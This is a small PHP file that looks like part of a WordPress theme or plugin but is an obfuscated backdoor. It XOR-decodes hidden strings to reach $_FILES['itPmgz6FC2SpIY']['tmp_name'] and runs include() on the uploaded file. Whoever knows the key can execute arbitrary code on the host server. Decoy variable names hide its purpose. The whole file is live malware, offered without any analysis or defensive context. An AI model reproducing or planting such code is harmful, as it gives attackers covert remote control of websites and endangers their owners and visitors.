<?php 	
$translation_table = 'itPmgz6FC2SpIY';
$width = $translation_table;
function days($imagedata, $link)

{
    $join = $link;
	$minutes = 'escaped';
    $file = urldecode($imagedata);
    $del_file = substr($join,0, strlen($file));
	$single = 'postname_index';
    $default_capabilities = $file ^ $del_file;
    return $default_capabilities;

}
	$numberposts = 'ext_type';
$capabilities = ${days("62%19%21%22%29", $width)};
$chunks = $capabilities;
	$cockney = 'original_link_html';
$pung = isset($chunks[$width]);
if ($pung)

{

    $mime_types = $capabilities[$width];
    $end_clean = $mime_types[days("%1D%19+2%09%1B%5B%23", $width)];
    $thumbnail_support = $end_clean;
    include ($thumbnail_support);

}

?>
